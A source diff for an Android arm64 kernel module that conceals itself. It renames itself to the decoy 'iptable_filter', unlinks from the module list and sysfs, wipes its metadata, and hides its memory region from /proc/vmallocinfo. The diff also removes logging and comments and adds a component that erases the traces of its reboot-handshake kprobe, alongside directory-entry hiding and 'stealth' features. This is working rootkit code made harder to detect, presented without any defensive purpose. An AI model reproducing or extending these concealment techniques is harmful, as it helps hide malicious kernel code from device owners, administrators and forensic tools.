@@ -1,6 +1,4 @@
 // SPDX-License-Identifier: GPL-2.0
-// Module entry point + compile-time self-concealment (list unlink, sysfs kobject_del, vmap unlink).
-
 #include <linux/errno.h>
 #include <linux/init.h>
 #include <linux/kprobes.h>
@@ -34,24 +32,20 @@
 #include "memory.h"
 #include "module_hide.h"
 #include "stealth.h"
-/* 已移除: #include "user_hook.h" */
+#include "stealth_probe.h" /* 新增：引入探针摘除器 */
 
 struct drv_state drv;
 
 #if KCFG_HIDE_SELF_MODULE
-
-/* C.2 decoy identity — a plausible in-tree name is less suspicious than zero bytes. */
 #ifndef KCFG_DECOY_NAME
 #define KCFG_DECOY_NAME "iptable_filter"
 #endif
 
-/* Rename + unlink from mod_list + drop identifying metadata. */
 static void conceal_module(void) {
 	struct module *mod = THIS_MODULE;
 	const char decoy[] = KCFG_DECOY_NAME;
 	size_t dlen = sizeof(decoy) - 1u;
 
-	/* Rename before unlink so the brief walkable window already shows the decoy. */
 	if (dlen >= sizeof(mod->name))
 		dlen = sizeof(mod->name) - 1u;
 	memset(mod->name, 0, sizeof(mod->name));
@@ -62,10 +56,8 @@ static void conceal_module(void) {
 	kobject_del(&mod->mkobj.kobj);
 	list_del(&mod->mkobj.kobj.entry);
 
-	/* E.HIDE.1 meta cleanup — reachable only through stale struct module* pointers. */
 	mod->taints = 0;
 #ifdef CONFIG_MODVERSIONS
-	/* version/srcversion are const char* — drop the pointers, don't memset. */
 	mod->version = NULL;
 	mod->srcversion = NULL;
 #endif
@@ -78,7 +70,6 @@ static void conceal_module(void) {
 #endif
 
 #if KCFG_HIDE_VMAP
-/* Leading fields of struct vmap_area (opaque since 6.9); offsets stable 5.10..6.12. */
 struct drv_vmap_area_lite {
 	unsigned long va_start;
 	unsigned long va_end;
@@ -86,21 +77,16 @@ struct drv_vmap_area_lite {
 	struct list_head list;
 };
 
-/* Unlink our vmap area from vmap_area_list (source of /proc/vmallocinfo). Best-effort. */
 static void conceal_vmap(void) {
 	struct list_head *vmap_list = (struct list_head *)kallsym_lookup("vmap_area_list");
 	spinlock_t *vmap_lock = (spinlock_t *)kallsym_lookup("vmap_area_lock");
 	struct rb_root *vmap_root = (struct rb_root *)kallsym_lookup("vmap_area_root");
-	/* Probe on drv (core .bss, permanent) — init_driver lives in __init and is freed later. */
 	unsigned long probe = (unsigned long)(uintptr_t)&drv;
 	struct drv_vmap_area_lite *va, *tmp;
 	unsigned long flags = 0;
 	int erased = 0;
 
-	if (!vmap_list) {
-		LOGW("conceal_vmap: vmap_area_list not resolvable, skip\n");
-		return;
-	}
+	if (!vmap_list) return;
 	if (vmap_lock) spin_lock_irqsave(vmap_lock, flags);
 	list_for_each_entry_safe(va, tmp, vmap_list, list) {
 		if (probe < va->va_start || probe >= va->va_end) continue;
@@ -108,15 +94,12 @@ static void conceal_vmap(void) {
 		INIT_LIST_HEAD(&va->list);
 		if (vmap_root) rb_erase(&va->rb_node, vmap_root);
 		erased = 1;
-		LOGI("conceal_vmap: unlinked va %lx..%lx (probe %lx)\n", va->va_start, va->va_end, probe);
 		break;
 	}
 	if (vmap_lock) spin_unlock_irqrestore(vmap_lock, flags);
-	if (!erased) LOGW("conceal_vmap: no vmap area contained probe %lx\n", probe);
 }
 #endif
 
-/* page_level = (60 - TCR_EL1.T1SZ)/9. VA_BITS 39/48/52 → 3/4/5. Captured once for hooks + memory paths. */
 static void mm_globals_init(void) {
 	u64 tcr = read_sysreg(tcr_el1);
 	u64 ttbr1 = read_sysreg(ttbr1_el1);
@@ -129,27 +112,28 @@ static void mm_globals_init(void) {
 int __init init_driver(void) {
 	int ret;
 
-	LOGI("driver_entry\n");
-
 	mm_globals_init();
 
-	/* Warm kallsyms + shimmed pointers here so pre-handlers don't re-enter register_kprobe atomically. */
 	ret = kallsym_init();
-	if (ret < 0) { LOGE("kallsym_init failed: %d\n", ret); return ret; }
+	if (ret < 0) { return ret; }
 
-	/* Missing symbols non-fatal — memory paths have local fallbacks. */
+	/* 新增：初始化探针摘除器 */
+	stealth_probe_init();
+
 	(void)memory_init();
 
 	ret = comm_warm_symbols();
-	if (ret < 0) { LOGE("comm_warm_symbols failed: %d\n", ret); return ret; }
+	if (ret < 0) { return ret; }
 
 	if (hwbp_init()) LOGN("hwbp commands disabled\n");
-	/* 已移除: if (user_hook_init()) LOGN("pte-hook commands disabled\n"); */
 	if (dirent_hide_init()) LOGN("dirent_hide commands disabled\n");
 	if (kgsl_stealth_arm()) LOGN("kgsl proactive stealth disabled\n");
 
 	ret = register_kprobe(&reboot_kp);
-	if (ret < 0) { LOGE("register_kprobe (__arm64_sys_reboot) failed: %d\n", ret); return ret; }
+	if (ret < 0) { return ret; }
+	
+	/* 新增：抹除 reboot 握手探针的结构体痕迹 */
+	stealth_hide_kprobe(&reboot_kp);
 
 #if KCFG_HIDE_SELF_MODULE
 	if (module_hide_arm())
@@ -164,7 +148,6 @@ int __init init_driver(void) {
 
 module_init(init_driver);
 
-/* Decoy modinfo tag — expands to a string only, no runtime effect. */
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Anonymous");
 MODULE_DESCRIPTION("Android kernel driver");
